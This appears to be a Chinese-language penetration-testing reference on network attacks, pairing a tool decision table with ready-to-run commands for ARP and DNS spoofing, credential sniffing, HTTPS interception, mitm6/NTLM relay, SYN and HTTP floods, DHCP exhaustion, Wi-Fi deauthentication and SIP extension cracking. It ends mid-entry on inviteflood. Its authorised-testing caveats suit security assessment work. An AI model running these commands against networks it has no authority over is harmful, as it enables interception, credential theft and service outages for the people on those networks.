# 网络攻防(Network Attacks)

> **何时读本文件**:当任务涉及中间人攻击(MITM)、ARP/DNS/DHCP 欺骗、流量嗅探与凭据截获、SSL/TLS 剥离、DoS 压力测试、VoIP/SIP 审计或 Cisco/路由协议攻击时,读取本文件。

## 快速决策表

| 任务场景 | 首选工具 | 备选 | 关键区别 |
|---|---|---|---|
| ARP 欺骗 + 嗅探一体化 | bettercap | ettercap | bettercap 模块化、支持 WiFi/BLE;ettercap 插件生态老牌 |
| ARP 欺骗(轻量组合) | arpspoof + dsniff/driftnet | ettercap | dsniff 套件自带 arpspoof,组合最省资源 |
| 明文凭据嗅探 | dsniff | tshark -Y 过滤 | dsniff 自动识别 30+ 协议并直接打印账号密码 |
| 抓包/离线分析 | tshark | tcpdump、netsniff-ng | tshark 有显示过滤器与字段提取;tcpdump 更轻量通用 |
| TCP 流重组还原 | tcpflow | tshark -z follow | tcpflow 把每条流自动存为单独文件 |
| DNS 欺骗 | dnschef / bettercap dns.spoof | dnsspoof(dsniff)、ettercap dns_spoof | dnschef 独立代理易控制;bettercap 内置联动 |
| HTTPS MITM(有 CA 信任) | mitmproxy | sslsplit、bettercap https.proxy | mitmproxy 交互式可改包;sslsplit 透明代理适合全流量 |
| IPv6 侧 MITM(AD 域) | mitm6 | bettercap | mitm6 利用 Windows DHCPv6 默认配置接管 DNS |
| 钓鱼型 MITM / 绕 2FA | evilginx2 | fluxion(无线) | evilginx2 反向代理+窃取会话 Cookie |
| 构造/发送任意包 | scapy | hping3、hexinject、t50 | scapy 是 Python 库可编程;hping3 命令行最快 |
| 二层攻击(STP/DHCP/CDP) | yersinia | bettercap、dhcpig | yersinia 覆盖协议最广;dhcpig 专精 DHCP 耗尽 |
| HTTP 慢速 DoS 测试 | slowhttptest | goldeneye、siege | slowhttptest 覆盖 4 类慢速攻击;goldeneye 是并发连接洪水 |
| 网络层压力测试 | hping3 | t50 | hping3 可精细控制 TCP 标志;t50 多协议注入吞吐高 |
| SSL 握手压力测试 | thc-ssl-dos | — | 利用 TLS 重协商开销不对称(服务端 15x) |
| SIP 服务器发现 | svmap | sippts scan | svmap 是 sipvicious 套件入口;sippts 功能更新更全 |
| SIP 分机枚举/爆破 | svwar / svcrack | sippts exten / rcrack | 同上,按套件习惯选择 |
| SIP 压力测试 | inviteflood | sipp、iaxflood(IAX) | inviteflood 定点灌 INVITE;sipp 可编排完整呼叫场景 |
| RTP 流分析/注入 | rtpbreak | sippts rtpbleed* | rtpbreak 重建会话为文件;sippts 检测 RTP Bleed 漏洞 |
| Cisco 设备扫描 | cisco-torch | cisco-ocs | cisco-torch 多进程+指纹;cisco-ocs 纯 IP 段批量 |
| Cisco 配置窃取(SNMP) | copy-router-config.pl | — | 需要 rw community + 本机 TFTP 服务 |
| Cisco 漏洞利用 | cge.pl | — | 内置 20+ 老 IOS 漏洞编号,按编号触发 |
| VoIP VLAN 跳跃 | voiphopper | — | 通过 CDP/DHCP 发现语音 VLAN 并接入 |
| MAC 伪装 | macchanger | bettercap mac.changer 模块 | macchanger 单一用途最简单 |

## 核心工具详解

### bettercap — 一体化模块化 MITM/侦察框架

**用途**:瑞士军刀级框架,集主机发现(net.probe/net.recon)、ARP 欺骗(arp.spoof)、嗅探(net.sniff)、DNS 欺骗(dns.spoof)、HTTP(S) 代理(http.proxy/https.proxy)、SYN 扫描(syn.scan)等模块于一体;还覆盖 WiFi/BLE/GPS 侦察。
**安装**:`sudo apt install bettercap`
**使用场景**:需要把"欺骗 + 嗅探 + 注入"串成一条流水线、且要频繁切换攻击目标时,首选 bettercap,避免 arpspoof/dsniff/dnschef 多进程拼装;做 WiFi 与有线统一攻击时也只有它支持。

```bash
sudo bettercap -iface eth0

# 进入交互式会话后(help 查看全部命令,get/set 管理变量):
net.probe on            # 主动探测网段内主机
net.show                # 列出发现的端点(IP/MAC/厂商/流量)
set arp.spoof.targets <victim-ip>   # 指定欺骗目标(默认整个网段)
arp.spoof on            # 启动 ARP 毒化
net.sniff on            # 嗅探并自动解析凭据(http/ftp/imap/smtp 等)

# DNS 欺骗组合
set dns.spoof.domains <domain>
set dns.spoof.address <attacker-ip>
dns.spoof on

# SSL 剥离(经 http.proxy)
set http.proxy.sslstript true   # 注意参数名就是 sslstript
http.proxy on

# 一键脚本(caplet)方式运行
sudo bettercap -iface eth0 -caplet <file.cap>
```

**实战要点**:
- 欺骗网关方向流量时内核需开转发:`echo 1 > /proc/sys/net/ipv4/ip_forward`(ettercap/arpspoof 同理)。
- 会自动加载 caplets;`caplets.update` 可在线更新,内置 `hstshijack` caplet 用于 HSTS 劫持剥离。
- `net.sniff` 捕获的凭据事件也可通过 `events.stream` 查看;用 `! <shell命令>` 可在会话内执行系统命令。
- 停止攻击务必 `arp.spoof off`,让目标 ARP 表恢复正常,避免测试后网络中断。

### arpspoof — 轻量 ARP 欺骗(dsniff 套件)

**用途**:持续向目标发送伪造 ARP 应答,把自己插入 victim↔gateway 之间的转发路径,是经典"ARP 欺骗 + 嗅探"组合的第一步。
**安装**:`sudo apt install dsniff`(arpspoof 是 dsniff 包成员)
**使用场景**:只想做纯流量转发再配合 dsniff/driftnet/tcpdump 等外部嗅探器,不需要 bettercap 的完整框架时;资源受限的跳板机上也更合适。

```bash
# 1. 开启内核 IP 转发(必须,否则目标断网)
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. 欺骗 victim:"我是网关"
arpspoof -i eth0 -t <victim-ip> <gateway-ip>

# 3. 另开终端做反方向,保证双向流量都经过攻击机
arpspoof -i eth0 -t <gateway-ip> <victim-ip>

# 之后并行挂任意嗅探器:
dsniff -i eth0          # 明文凭据
driftnet -i eth0        # 图片
tcpdump -i eth0 -w mitm.pcap
```

**实战要点**:
- 只跑单向(步骤 2)时 victim→gateway 的流量会黑洞,目标会明显卡顿,务必双向。
- `arpwatch` 在目标网段运行时会把你的 MAC/IP 变化上报邮件,是蓝军检测 ARP 欺骗的常见手段。
- Ctrl+C 退出时 arpspoof 会恢复原始映射,但某些系统需手动 `ip neigh flush` 或等待 ARP 超时。
- 交换机端口安全(Dynamic ARP Inspection / port-security)开启时此攻击失效。

### dsniff — 明文凭据嗅探套件

**用途**:被动嗅探并自动解析几十种协议中的账号密码/邮件/URL/文件,套件还包含 arpspoof、dnsspoof、macof、tcpkill、webspy 等配套工具。
**安装**:`sudo apt install dsniff`
**使用场景**:已进入流量路径(hub 环境、镜像口、或配合 arpspoof)后想"零配置直接出凭据";比 tshark 手写过滤器省事,但只覆盖明文协议。

```bash
dsniff -i eth0                  # 主嗅探器,-m 自动检测协议
urlsnarf -i eth0                # 输出受害者访问的 URL(常见日志格式)
mailsnarf -i eth0               # 重组并打印邮件内容
msgsnarf -i eth0                # 捕获即时消息/聊天内容
filesnarf -i eth0               # 提取 NFS/SMB 等传输中的文件
webspy -i eth0 <victim-ip>      # 把受害者浏览的 URL 实时发到本机浏览器

# DNS 欺骗:伪造 hosts 文件中的域名解析
dnsspoof -i eth0 -f <hosts-file>    # 文件格式同 /etc/hosts

# 交换机 CAM 表溢出(使其退化为 hub,便于被动嗅探;噪音大易被发现)
macof -i eth0

# 杀掉指定主机的 TCP 连接
tcpkill -i eth0 host <victim-ip>
```

**实战要点**:
- 全部工具只对明文协议有效(HTTP/FTP/POP3/SMTP/TELNET 等);HTTPS 时代主要价值在内网老设备与协议审计。
- `dsniff -m` 在流量混杂时可避免逐协议试错;输出格式为 `protocol: user/pass`。
- dnsspoof 的 hosts 文件支持通配整个域,如 `192.168.1.50\t*.example.com`。
- macof 每秒发数千伪造 MAC 包,对生产网属于高破坏性操作,授权范围内慎用。

### driftnet — 从流量中提取并显示图片

**用途**:监听 TCP 流,实时抠出其中传输的 JPEG/GIF 等图片并弹出展示,可直观证明"流量可被读取"。
**安装**:`sudo apt install driftnet`
**使用场景**:ARP 欺骗成立后做可视化演示/汇报(截图证据);配合 urlsnarf 呈现受害者的浏览行为。

```bash
driftnet -i eth0                 # 弹窗实时显示嗅到的图片
driftnet -i eth0 -a -d /tmp/driftnet   # -a 附属模式:不弹窗,图片落盘并在 stdout 打印文件名
```

**实战要点**:
- 必须先有流量路径:hub、SPAN 口或 arpspoof/ettercap 欺骗之后,否则在交换网里基本抓不到别人的流。
- `-a` 附属模式只打印文件名不显示,适合脚本化归档。
- HTTPS 普及后命中率有限,对仍走 HTTP 的内网系统/ IoT 设备效果最好。

### ettercap — 多用途嗅探/拦截/日志框架(交换局域网)

**用途**:支持主动/被动解析大量协议,内置 ARP 欺骗、端口窃取、包过滤与注入;插件体系含 dns_spoof 等经典插件。
**安装**:`sudo apt install ettercap-text-only`(控制台版)/ `sudo apt install ettercap-graphical`(GUI 版)
**使用场景**:需要比 arpspoof 更自动化的双向 ARP MITM、或要用过滤器(.ef 文件)实时改包/断流时;老牌稳定,但 HTTP 时代之后凭据捕获能力弱于 bettercap。

```bash
# 文本模式 ARP 双向欺骗:victim ↔ gateway
sudo ettercap -T -i eth0 -M arp:remote /<victim-ip>/ /<gateway-ip>/

# 欺骗整个网段(两个空目标)
sudo ettercap -T -i eth0 -M arp:remote // //

# 加载 DNS 欺骗插件(先编辑 /etc/ettercap/etter.dns 指定域名→IP)
sudo ettercap -T -M arp:remote -P dns_spoof /<victim-ip>/ //

# 交互界面内:p 列出/加载插件,s 保存流量,q 退出
```

**实战要点**:
- 目标语法 `/MAC/IPs/PORTs`,如 `/192.168.1.0-254/ 80`;`arp:remote` 表示同时嗅探经网关转发的远端流量。
- ettercap 0.8+ 默认关闭统一嗅探时的 IP 转发由自身处理,退出时自动还原 ARP;异常退出要手动恢复。
- 过滤器需先用 etterfilter 编译:`etterfilter <filter.ef> -o <filter.ef.out>`,再 `-F` 加载。
- Debian 包拆分:ettercap-common(数据文件)、ettercap-text-only、ettercap-graphical 三件套。

### mitmproxy — 可编程的 HTTPS 中间人代理

**用途**:交互式 HTTP/HTTPS MITM 代理,可实时查看、修改、重放请求;mitmdump 提供无界面命令行模式,支持 Python 脚本(hook)自动改包。
**安装**:`sudo apt install mitmproxy`
**使用场景**:Web 应用层测试(改请求/响应、测会话逻辑)、抓 API 流量;相比 sslsplit 更偏"人看/人改",sslsplit 偏"全量落盘"。

```bash
# 官网示例:显式代理监听 2139 端口
mitmproxy -p 2139

# 命令行模式:透明代理 + 全量写文件
mitmdump --mode transparent -w <file>

# 反向代理模式:前置到指定后端
mitmdump --mode reverse:http://<backend-host> -p 8080

# 挂载改包脚本(脚本内实现 request/response 钩子)
mitmdump -s <script.py> -p 8080

# 透明模式需要 iptables 把 80/443 重定向过来:
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
```

**实战要点**:
- HTTPS 解密要求客户端信任其 CA(首启生成于 `~/.mitmproxy/`,证书文件 `mitmproxy-ca-cert.cer`);移动端测试常直接安装该证书。
- 交互快捷键:Enter 进入流详情、Tab 切换 request/response、`e` 编辑、`r` 重放。
- 不装 CA 证书时可退而求其次只做 HTTP 明文与 SSL 剥离类测试。

### sslsplit — 透明 SSL/TLS 拦截与全量落盘

**用途**:针对 SSL/TLS 连接的透明 MITM 工具:经 NAT/iptables 劫持的连接被它终结后重建到真实目的地,所有明文数据按连接/类型落盘,适合取证与全量记录。
**安装**:`sudo apt install sslsplit`
**使用场景**:需要"无差别记录所有被劫持流量"(含非 HTTP 的 TLS 协议如 SMTPS/IMAPS/FTP over TLS),且能控制受害者信任锚(预置 CA)时。

```bash
# 生成自签 CA(受害者需导入信任 ca.crt)
openssl req -new -x509 -keyout ca.key -out ca.crt -days 3650 -nodes

# 官网示例:调试模式,日志/内容分目录,SSL 8443、明文 8080
sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt \
  ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

# 配合 iptables 把网关角色的流量转发进来:
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
```

**实战要点**:
- `-S <dir>` 按"日期/连接"分目录保存解密内容,连日志在 `-l` 文件里,汇报时按时间轴取证。
- 与 arpspoof 组合即构成"ARP 欺骗 → 透明 HTTPS 拦截"完整链;不装 CA 时客户端会报证书告警。
- 结束后务必清空 nat 表规则:`iptables -t nat -F`。
- `-D` 调试模式打印详细连接信息,排障时用;正式长跑去掉。

### dnschef — 面向渗透测试的 DNS 代理(Fake DNS)

**用途**:高度可配置的 DNS 代理:默认全代理转发,可指定把某些域名解析到伪造 IP,或整体接管(fakes everything)。
**安装**:`sudo apt install dnschef`
**使用场景**:配合 MITM 位置(arpspoof 后劫持 53 端口、伪造 DHCP 下发的 DNS、或本机测试恶意软件 C2 解析)做定向域名欺骗,比 dnsspoof 更细粒度可控。

```bash
# 无参数 = 纯代理模式(官网示例行为)
dnschef

# 把指定域名的解析伪造成 attacker-ip
dnschef --fakeip <attacker-ip> --fakedomains <domain1>,<domain2> --interface <listen-ip>

# 劫持所有域名(配合受害者 DNS 指向本机)
dnschef --fakeip <attacker-ip> --interface <listen-ip>

# 让 mitm 位置上的 53 端口流量落到 dnschef:
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to <attacker-ip>
```

**实战要点**:
- 未列入 `--fakedomains` 的查询照常转发到真实上游(默认 8.8.8.8,`--nameservers` 可改),不影响受害者其他上网,隐蔽性好。
- 与 bettercap 的 dns.spoof 二选一:前者独立进程好编排,后者与 arp.spoof 在同一会话内联动。

### mitm6 — 通过 IPv6(DHCPv6)接管 Windows 的 DNS

**用途**:利用 Windows 默认启用 IPv6 且 DHCPv6 优先的特性,应答 DHCPv6 请求把自己设为受害者默认 DNS 服务器,从而劫持内网域名解析(常用于 AD 中继攻击链)。
**安装**:`sudo apt install mitm6`
**使用场景**:目标内网有 Windows 域环境、想绕过 IPv4 层防护做 NTLM 中继(WPAD/代理劫持)时;这是 IPv4 MITM 之外的第二条路径。

```bash
# 最常用:针对指定域名接管 DNS
sudo mitm6 -i eth0 -d <ad-domain>

# -r 指定认证中继目标(与 ntlmrelayx 配合,用作假 DNS 主机名触发 Kerberos 认证)
sudo mitm6 -i eth0 -d <ad-domain> -r <target>

# 只攻击特定主机用 -hw/--host-allowlist
sudo mitm6 -i eth0 -d <ad-domain> -hw <fqdn>

# 经典组合:mitm6 抓到认证后交给 impacket 的 ntlmrelayx 中继(需另装 impacket)
sudo ntlmrelayx.py -6 -wh wpad.<ad-domain> -l <loot-dir>
```

**实战要点**:
- mitm6 只做 DNS 接管,本身不解密流量;杀伤力在"内网名称解析被定向到攻击者服务"。
- 关键缓解:域内禁用 WPAD 全局查询保护、关闭 DHCPv6/RA 防护缺失等;测试报告应验证这些配置。
- 会周期性续租 DHCPv6,中断工具后受害者 IPv6 DNS 需等待租约过期或手动刷新。

### tshark / wireshark — 命令行抓包与深度协议分析

**用途**:Wireshark 家族的 CLI;tshark 支持捕获过滤器(-f,BPF 语法)、显示过滤器(-Y,wireshark 语法)、字段提取(-T fields)与统计(("-z")),协议解析器覆盖面最大。
**安装**:`sudo apt install tshark`(Kali 默认已装;GUI 版 `sudo apt install wireshark`)
**使用场景**:MITM 位置上做精准取证;pcap 离线分析;把协议字段以 CSV 形式导出给脚本处理。GUI(wireshark)适合人工追流,tshark 适合自动化。

```bash
# 官网示例:BPF 捕获过滤器
tshark -f "tcp port 80" -i eth0

# 抓包存盘
tshark -i eth0 -w <file>.pcap

# 提取 HTTP 请求(显示过滤器 + 字段导出)
tshark -i eth0 -Y 'http.request' \
  -T fields -e ip.src -e http.host -e http.request.uri

# 离线 pcap 提取 FTP 凭据
tshark -r <file>.pcap \
  -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
  -T fields -e ip.src -e ftp.request.command -e ftp.arg

# 重组 TCP 流(第 0 条,ASCII 视图)
tshark -r <file>.pcap -q -z follow,tcp,ascii,0

# 协议层级统计/会话统计
tshark -r <file>.pcap -q -z io,phs
tshark -r <file>.pcap -q -z conv,ip
```

**实战要点**:
- `-f`(内核层 BPF,抓之前过滤)与 `-Y`(抓之后按 wireshark 语法过滤)语义不同;组合 `-f "port 5060" -Y "sip"` 是 VoIP 分析常用式。
- 凭据类过滤器速查:HTTP Basic → `http.authorization`;SIP Digest → `sip.Proxy-Authorization`(子字段 `sip.auth.username` / `sip.auth.digest.response`);Kerberos → `kerberos.CNameString`。
- 大流量场景先 `-w` 落盘再离线分析,避免实时解析拖丢包。
- GUI 捕获选项里同样可用上述两种过滤器;stratoshark(Wireshark 家族)用于系统调用/日志分析。

### tcpdump — 轻量命令行抓包器

**用途**:最经典 CLI 嗅探器,支持 BPF 过滤、ASCII/十六进制打印、写 pcap;几乎所有环境都可用它先取证。
**安装**:Kali 默认已装(`sudo apt install tcpdump`)
**使用场景**:快速验证欺骗是否生效、抓最小化 pcap、资源受限或无 tshark 的环境;配合 arpspoof 作为通用记录器。

```bash
tcpdump -i eth0 -w <file>.pcap                 # 抓包存盘
tcpdump -i eth0 -nn host <ip> and port 80      # 按主机+端口过滤,-nn 禁用名称解析
tcpdump -i eth0 -A -s0 'tcp port 80'           # ASCII 显示 HTTP 内容,-s0 不截断
tcpdump -r <file>.pcap 'arp'                   # 离线只看 ARP(验证 ARP 欺骗)
tcpdump -i eth0 'icmp[icmptype] = 8'           # 仅 ICMP echo request(扫活指纹)
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' # 仅 SYN 包(端口扫描观察)
```

**实战要点**:
- 验证 ARP 毒化:`tcpdump -i eth0 -e arp`,看到重复的 is-at 应答即说明欺骗报文在发。
- `-e` 显示链路层 MAC,排查欺骗方向(谁冒充谁)必备。
- 输出 pcap 与 tshark/wireshark 完全互通,形成"tcpdump 采集 → tshark 分析"流水线。

### tcpflow — TCP 流重组记录器

**用途**:按 TCP 连接重组完整数据流并每条流存一个文件,正确处理重传/乱序;适合"以会话为单位"阅读明文内容。
**安装**:`sudo apt install tcpflow`
**使用场景**:抓到 pcap 或实时流量后想直接看每条连接的完整 payload(如还原 HTTP 报文、导出传输内容),比 tshark follow 逐条点更自动化。

```bash
tcpflow -i eth0 -c                 # 实时嗅探,-c 直接打印到终端
tcpflow -r <file>.pcap             # 离线重组 pcap 内所有流
tcpflow -i eth0 host <victim-ip>   # 只记录指定主机
```

**实战要点**:
- 输出文件名形如 `源IP.端口-目的IP.端口`,按时间顺序 grep 敏感串非常方便。
- 默认输出目录为当前工作目录,建议先 `mkdir <dir> && cd <dir>` 再跑。
- 只重组 TCP;UDP(DNS/SIP)内容用 tshark 处理。

### scapy — Python 数据包构造/嗅探/扫描库

**用途**:交互式包工场:定义任意分层报文、发送、匹配应答;可替代 hping、大部分 nmap 用途、arpspoof、arping、tcpdump 的组合。
**安装**:`sudo apt install python3-scapy`
**使用场景**:需要精细/程序化控制报文(自定义协议、异常包模糊测试、自动化扫描脚本),或一次性完成"发包+收包+比对"时;比命令行工具灵活但速度慢。

```bash
sudo scapy

# ARP 存活扫描(经典)
ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)
ans.summary(lambda s: s[1].sprintf("%ARP.psrc%  %Ether.src%"))

# SYN 探测端口
sr1(IP(dst="<ip>")/TCP(dport=80, flags="S"), timeout=2)

# ICMP 探测/压测
send(IP(dst="<ip>")/ICMP(), loop=1, inter=0)

# 离线读 pcap
pkts = rdpcap("<file>.pcap"); pkts.summary()

# 脚本内使用
# from scapy.all import *
```

**实战要点**:
- `sr/srp` 收发配对,`send/sendp` 只发不收,`sr1` 取第一个应答;二层包(Ether)用 `p` 结尾版本。
- 默认不启用混杂转发;做 MITM 仍需系统层 IP 转发配合。
- 大规模扫描时注意 `timeout` 与 `verbose=0`,否则输出刷屏且会话挂起。
- 官方描述:可替代 hping、85% 的 nmap、arpspoof、arping、tcpdump、p0f 等——但工程化场景仍建议专用工具。

### yersinia — 二层协议攻击框架

**用途**:针对 STP、CDP、DHCP、DTP、VTP、802.1Q、802.1X、HSRP 等二层协议的攻击/测试框架,可发起 DHCP 耗尽、STP 根桥抢占、CDP 泛洪等。
**安装**:`sudo apt install yersinia`
**使用场景**:评估交换网络健壮性:验证端口安全、DHCP Snooping、BPDU Guard 等防护是否到位;单工具覆盖二层几乎所有协议。

```bash
sudo yersinia -I                        # 交互式(ncurses)界面
sudo yersinia -G                        # GTK 图形界面
sudo yersinia -protocol DHCP -attack 1  # DHCP DISCOVER 耗尽攻击(耗尽地址池)
sudo yersinia -protocol STP -attack 4   # 发送 BPDU 抢占根桥(拓扑震荡)
```

**实战要点**:
- 交互模式下按 `h` 帮助、`x` 选择攻击、`l` 列出协议;非交互 `-attack <id>` 每个协议编号含义见 man。
- STP/DHCP 攻击会实时破坏全网可用性,务必在授权隔离网段执行。
- 防御验证点:DHCP Snooping + 动态 ARP 检测(DAI)、BPDU Guard、端口 security 开启后对应攻击应失败——失败本身就是测试结论。

### hping3 — 可脚本化的 TCP/UDP/ICMP 包构造器

**用途**:发送定制 ICMP/UDP/TCP 包并像 ping 一样显示应答;可做防火墙规则测试、欺骗源扫描、路径 MTU、协议栈审计、压测。
**安装**:`sudo apt install hping3`
**使用场景**:需要命令行快速构造特定标志位/分片/载荷的包(比 scapy 轻、比 t50 细);也是经典的 SYN/ICMP 洪水压测工具。

```bash
# 官网示例:ICMP 模式 traceroute
hping3 --traceroute -V -1 www.example.com

# 对 80 端口 SYN 洪水压力测试(随机源地址)
hping3 -S -p 80 --flood --rand-source <target>

# 单发 SYN 探测端口开放情况
hping3 -S -p <port> -c 1 <target>

# 伪造源地址发包(测试防火墙/反向路径过滤)
hping3 -S -a <spoof-ip> -p <port> <target>
```

**实战要点**:
- `-0/-1/-2` 分别为 raw IP/ICMP/UDP 模式,默认 TCP;`-c` 限定包数,`--flood` 不等应答全速发。
- `--rand-source` 会迅速触发 IDS,做压测的同时也顺带验证检测能力。
- 老 Tcl 脚本接口(hping3 的交互模式)已很少用,命令行参数足够覆盖日常。

### t50 — 多协议高速包注入器

**用途**:支持 15 种协议(TCP/UDP/ICMP/IGMP/RIP/DCCP/PIM 等)的高性能包注入工具,并发多线程,适合网络设备压测与协议栈健壮性测试。
**安装**:`sudo apt install t50`
**使用场景**:对路由器/防火墙等网络设备做协议层压力与稳定性测试,吞吐需求高时优于 hping3。

```bash
# 官网示例:默认协议(TCP)洪水注入,Ctrl+C 停止
t50 --flood <target>

# 限定发送总包数(--threshold 默认 1000,避免直接打瘫)
t50 --threshold 100 <target>
```

**实战要点**:
- `--threshold` 限定发送的总包数(默认 1000);`--flood` 会忽略该上限持续注入,链路会被瞬间打满,生产测试用 `--threshold`。
- 支持同时叠加多种协议头(fingerprint),用于测试设备解析异常。
- 与 IDS/IPS 联测时可观察检测率,T50 流量特征明显、易被指纹。

### slowhttptest — 应用层慢速 DoS 模拟

**用途**:模拟 slowloris 等低带宽应用层 DoS:慢头发送、慢 POST、Range 攻击、慢读取四类,验证 Web 服务器超时与连接限制配置。
**安装**:`sudo apt install slowhttptest`
**使用场景**:授权压测 Web 服务可用性;相比大流量洪水,慢速攻击仅需极小带宽即可占用连接池,重点验证服务器是否可被少量连接拖死。

```bash
# 官网示例:slowloris 模式(-H)压测目标
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET \
  -u http://<target>/index.php -x 24 -p 3
```

**实战要点**:
- 四种模式:`-H` 慢头部(slowloris)、`-B` 慢 POST 体、`-R` Range 攻击、`-X` 慢读取;先 `-H` 再按服务器类型换模式。
- `-g -o <prefix>` 生成 CSV/HTML 统计图,直接用于报告。
- "service available: NO" 出现即表示服务被拖垮;结论应附缓解建议(限并发、缩短 header 超时、前置反代)。

### thc-ssl-dos — SSL/TLS 握手压力测试

**用途**:利用 TLS 重协商在服务端消耗约 15 倍于客户端算力的不对称性,持续发起重协商拖垮 HTTPS 服务。
**安装**:`sudo apt install thc-ssl-dos`
**使用场景**:验证 HTTPS 端点对握手风暴的韧性(限速、WAF、禁用重协商配置)。

```bash
# 官网示例:100 并发连接打 443
thc-ssl-dos -l 100 <target-ip> 443 --accept
```

**实战要点**:
- 目标必须允许重协商才有效;RFC 5746 之后大量服务默认禁用或限速重协商,打不动本身就是"通过"结论。
- 输出的 h/s(每秒握手数)与 Err 计数可直接做容量对比。

### goldeneye — HTTP Keep-Alive DoS 测试

**用途**:基于 HTTP Keep Alive 与无限制 header 的并发压力工具,用相对少的带宽维持大量占用连接,检验 Web 服务器配置。
**安装**:`sudo apt install goldeneye`
**使用场景**:与 slowhttptest 互补的"数量型"HTTP 压测:验证连接数上限、超时、反向代理缓冲行为。

```bash
goldeneye http://<target>/ -w 50 -s 500     # 50 个 worker × 500 socket
```

**实战要点**:
- `-w` 并发 worker、`-s` 每 worker socket 数;从小到大递增观察拐点。
- 仅对授权目标使用;打靶时同步在服务端观察连接表与负载,形成可度量的结论。

### dhcpig — DHCP 地址池耗尽(scapy 实现)

**用途**:发起高级 DHCP 耗尽:消耗全部可用 IP、阻止新用户获址、释放在用 IP,并发 gratuitous ARP 使 Windows 主机掉线。
**安装**:`sudo apt install dhcpig`
**使用场景**:测试 DHCP Snooping、端口限速等防护是否生效;影响面是整个网段,只应在隔离授权环境执行。

```bash
# 官网示例:耗尽 eth0 所在网段地址池(需 root)
pig.py eth0
```

**实战要点**:
- 与 yersinia 的 DHCP 攻击相比,它还会主动释放他人租约并 GARP 断网,"杀伤"更彻底。
- 防御验证:DHCP Snooping 信任端口配置正确时,来自非信任端口的 DHCPRELEASE/DISCOVER 应被丢弃。

### mdk3 — IEEE 802.11 无线攻击工具

**用途**:利用 Wi-Fi 协议层弱点的概念验证工具:认证洪水、beacon 泛洪、去认证、Michael 抗性测试等无线 DoS 手段。
**安装**:`sudo apt install mdk3`
**使用场景**:授权无线安全评估中对 AP 健壮性做压力验证(注意:去认证等攻击会直接影响真实用户)。

```bash
# 官网示例:认证 DoS 模式(a)——大量伪造客户端尝试认证
mdk3 wlan0 a

# 其他模式:b=beacon 泛洪、d=去认证、m=Michael 关断(完整列表:mdk3 --help)
```

**实战要点**:
- 需先 `airmon-ng check kill` 并把网卡置为 monitor 模式(详见无线领域文档);`wlan0` 换成 mon 接口名。
- Kali 中后续版本为 mdk4(命令兼容,`mdk4 <iface> a`);老 AP 认证洪水可致其重启。
- 无线 DoS 在多数辖区属明确违法行为,仅限授权测试与自有实验环境。

### sipvicious(svmap/svwar/svcrack/svreport/svcrash)— SIP/VoIP 审计套件

**用途**:五件套:`svmap` 发现 SIP 服务器、`svwar` 枚举可用分机、`svcrack` 在线爆破分机密码、`svreport` 整理结果、`svcrash` 反制探测扫描器。
**安装**:`sudo apt install sipvicious`
**使用场景**:VoIP 内网渗透第一步:先 svmap 找 PBX,再 svwar 摸分机号段,最后 svcrack 爆破;经典流程成熟、上手最快。

```bash
# 官网示例:扫网段找 SIP 服务器
svmap <cidr> -v                       # 例:svmap 192.168.1.0/24 -v

# 枚举有效分机(-e 指定号段,-m 选择方法)
svwar -m INVITE -e 100-999 <target>

# 对分机做密码爆破
svcrack -u <ext> -d <wordlist> <target>

# 汇总历史结果
svreport list
```

**实战要点**:
- svwar 默认用 OPTIONS,有些 PBX 只对 INVITE 表现出分机存在性差异,两种方法都跑一遍。
- 爆破会写满失败登录日志,授权窗口内控制速率(`--rate` 类参数见各工具 help)。
- svcrash 用于"踢掉"别人对你 PBX 的 svmap 扫描,属防御性用法。

### sippts — 现代 SIP/VoIP 审计工具集

**用途**:Python 实现的 SIP 审计全家桶,子命令覆盖扫描、分机枚举、密码破解、 floods、伪造、嗅探与 RTP Bleed 系列检测:`scan exten rcrack send wssend enumerate leak ping invite dump dcrack flood sniff spoof pcapdump rtpbleed rtcpbleed rtpbleedflood rtpbleedinject astami video`。
**安装**:`sudo apt install sippts`
**使用场景**:sipvicious 的现代替代:需要 RTP Bleed 漏洞检测、Asterisk 配置审计(astami)、pcap 深度处理时必选。

```bash
# 网段发现 SIP 服务
sippts scan -i <cidr>

# 枚举分机
sippts exten -i <ip> -r 100-999

# RTP Bleed 漏洞检测(检测 PBX 是否可被注入/泄露 RTP)
sippts rtpbleed -i <ip>
```

**实战要点**:
- `rtpbleed`/`rtcpbleed` 对应 CVE-2017-18041 类问题:媒体端口未校验来源即可被劫持通话音频;检测后附修复建议(绑定信令协商地址)。
- `sniff`/`pcapdump` 可直接落地 SIP 会话,与 rtpbreak 互补。
- 全部子命令 `sippts <cmd> -h` 有完整参数说明。

### sipp — SIP 流量发生器

**用途**:开源 SIP 压测工具,内置 UAC/UAS 等 SipStone 场景,可用 XML 编排复杂呼叫流程,实时显示呼叫速率/时延/消息统计。
**安装**:`sudo apt install sipp`
**使用场景**:对 PBX/软交换做容量与稳定性测试(而非破坏):模拟数百路并发呼叫验证系统规格。

```bash
# 官网示例:以内置 UAS 场景当被叫方
sipp -sn uas

# 作为主叫压测目标(默认 uac 场景,-r 呼叫速率)
sipp -sn uac -r 10 <target>

# 自定义场景文件
sipp -sf <scenario.xml> <target>
```

**实战要点**:
- 屏幕按 1-9 切换统计视图;CSV 周期性落盘便于容量报告。
- 文件描述符默认限制 1024,高并发前先 `ulimit -n` 提高。
- 压测话机/PSTN 网关时注意 `-r` 从低爬升,防止直接打瘫语音服务。

### inviteflood — SIP/SDP INVITE 洪水

**用途**:经 UDP 向目标 SIP 设备灌大量 INVITE 报文,测试其过载防护。
**安装**:`sudo apt install inviteflood`
**使用场景**:VoIP 设备 DoS 韧性测试;与 sipp 的区别是"纯灌量"而非模拟合法呼叫流程。

```bash
# 官网示例:eth0 上向 PBIP 灌 100 个 INVITE
